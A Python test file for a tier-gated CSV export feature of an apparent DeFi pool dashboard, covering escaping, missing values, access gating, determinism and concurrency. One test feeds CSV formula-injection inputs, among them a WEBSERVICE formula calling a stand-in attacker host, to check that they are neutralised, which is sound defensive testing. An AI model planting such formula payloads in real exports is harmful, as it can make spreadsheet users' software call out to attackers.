from __future__ import annotations

import csv
import io
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pandas as pd

from csv_export import CSV_COLUMNS, CSV_UPGRADE_MESSAGE, prepare_csv_export, serialize_csv
from product_capabilities import ProductTier, capabilities_for_tier


ROOT = Path(__file__).parents[1]


def representative_rows(count: int = 3) -> pd.DataFrame:
    return pd.DataFrame(
        [
            {
                "pool": f"pool-{index:06d}",
                "project": "Mörpho, Labs" if index == 0 else f"Protocol {index}",
                "chain": "Base\nL2" if index == 1 else "Arbitrum",
                "symbol": 'USDC "Prime"' if index == 2 else "USDC",
                "strategy_type": "Lending",
                "apy": None if index == 1 else 8.25 + index,
                "apyBase": 7.0,
                "apyReward": None,
                "tvlUsd": None if index == 2 else 20_000_000 + index,
                "risk_score": None if index == 1 else 30,
                "risk_band": None if index == 1 else "Moderate",
                "signal": None if index == 2 else "Steady",
                "pool_url": f"https://example.test/pool-{index}",
            }
            for index in range(count)
        ]
    )


def decode(content: bytes) -> list[list[str]]:
    return list(csv.reader(io.StringIO(content.decode("utf-8-sig"))))


def test_zero_one_and_representative_csv_are_valid_and_keep_canonical_identity() -> None:
    empty = pd.DataFrame(columns=CSV_COLUMNS)
    assert decode(serialize_csv(empty)) == [list(CSV_COLUMNS)]

    one = decode(serialize_csv(representative_rows(1)))
    assert one[0][0] == "pool"
    assert one[1][0] == "pool-000000"
    assert "Mörpho, Labs" in one[1]

    normal = decode(serialize_csv(representative_rows()))
    assert len(normal) == 4
    assert normal[0] == [column for column in CSV_COLUMNS if column in representative_rows().columns]
    assert normal[2][normal[0].index("chain")] == "Base\nL2"
    assert normal[3][normal[0].index("symbol")] == 'USDC "Prime"'


def test_missing_values_are_empty_not_zero_and_column_order_is_deterministic() -> None:
    rows = representative_rows()
    first = serialize_csv(rows)
    second = serialize_csv(rows.copy())
    parsed = decode(first)

    assert first == second
    assert parsed[2][parsed[0].index("apy")] == ""
    assert parsed[3][parsed[0].index("tvlUsd")] == ""
    assert parsed[2][parsed[0].index("risk_score")] == ""
    assert parsed[3][parsed[0].index("signal")] == ""


def test_formula_like_text_is_neutralized_without_corrupting_numbers() -> None:
    rows = pd.DataFrame(
        [
            {
                "pool": "=WEBSERVICE(\"https://attacker.test\")",
                "project": "+SUM(1,1)",
                "chain": "-2+3",
                "symbol": "@cmd",
                "apy": -12.5,
                "tvlUsd": 42,
            }
        ]
    )
    parsed = decode(serialize_csv(rows))
    values = dict(zip(parsed[0], parsed[1], strict=True))

    assert values["pool"].startswith("'=")
    assert values["project"].startswith("'+")
    assert values["chain"].startswith("'-")
    assert values["symbol"].startswith("'@")
    assert values["apy"] == "-12.5"
    assert values["tvlUsd"] == "42"


def test_execution_gate_denies_free_core_plus_and_allows_future_and_compatibility_pro() -> None:
    rows = representative_rows(1)
    for tier in (ProductTier.FREE, ProductTier.CORE, ProductTier.PLUS):
        result = prepare_csv_export(rows, capabilities_for_tier(tier))
        assert result.allowed is False
        assert result.content is None
        assert result.message == CSV_UPGRADE_MESSAGE

    result = prepare_csv_export(rows, capabilities_for_tier(ProductTier.PRO))
    assert result.allowed is True
    assert result.content
    assert result.row_count == 1


def test_repeated_unauthorized_attempts_never_generate_bytes_or_state() -> None:
    denied = capabilities_for_tier(ProductTier.PLUS)
    results = [prepare_csv_export(representative_rows(100), denied) for _ in range(20)]

    assert all(not result.allowed and result.content is None and result.row_count == 0 for result in results)


def test_large_50k_export_has_no_truncation_and_stable_schema() -> None:
    rows = representative_rows(50_000)
    content = prepare_csv_export(rows, capabilities_for_tier(ProductTier.PRO)).content
    assert content is not None
    parsed = decode(content)

    assert len(parsed) == 50_001
    assert parsed[0][0] == "pool"
    assert parsed[-1][0] == "pool-049999"


def test_twenty_repeated_exports_are_deterministic_and_stateless() -> None:
    rows = representative_rows(3_000)
    capabilities = capabilities_for_tier(ProductTier.PRO)
    outputs = [prepare_csv_export(rows, capabilities).content for _ in range(20)]

    assert outputs[0] is not None
    assert all(output == outputs[0] for output in outputs)


def test_four_concurrent_exports_do_not_cross_contaminate() -> None:
    capabilities = capabilities_for_tier(ProductTier.PRO)

    def export(user_number: int) -> bytes | None:
        rows = representative_rows(2_000)
        rows["pool"] = rows["pool"].map(lambda value: f"user-{user_number}-{value}")
        return prepare_csv_export(rows, capabilities).content

    with ThreadPoolExecutor(max_workers=4) as executor:
        outputs = list(executor.map(export, range(4)))

    for user_number, output in enumerate(outputs):
        assert output is not None
        text = output.decode("utf-8-sig")
        assert f"user-{user_number}-pool-000000" in text
        assert all(f"user-{other}-pool-000000" not in text for other in range(4) if other != user_number)


def test_export_implementation_has_no_raw_is_pro_authorization_dependency() -> None:
    source = (ROOT / "csv_export.py").read_text(encoding="utf-8")
    app_source = (ROOT / "app.py").read_text(encoding="utf-8")
    export_surface = app_source[app_source.index("csv_export = prepare_csv_export") : app_source.index("Discovery guidance")]

    assert "is_pro" not in source
    assert "is_pro" not in export_surface
    assert "prepare_csv_export(filtered, capabilities)" in export_surface
    assert "export_enabled and csv_export.allowed" in export_surface
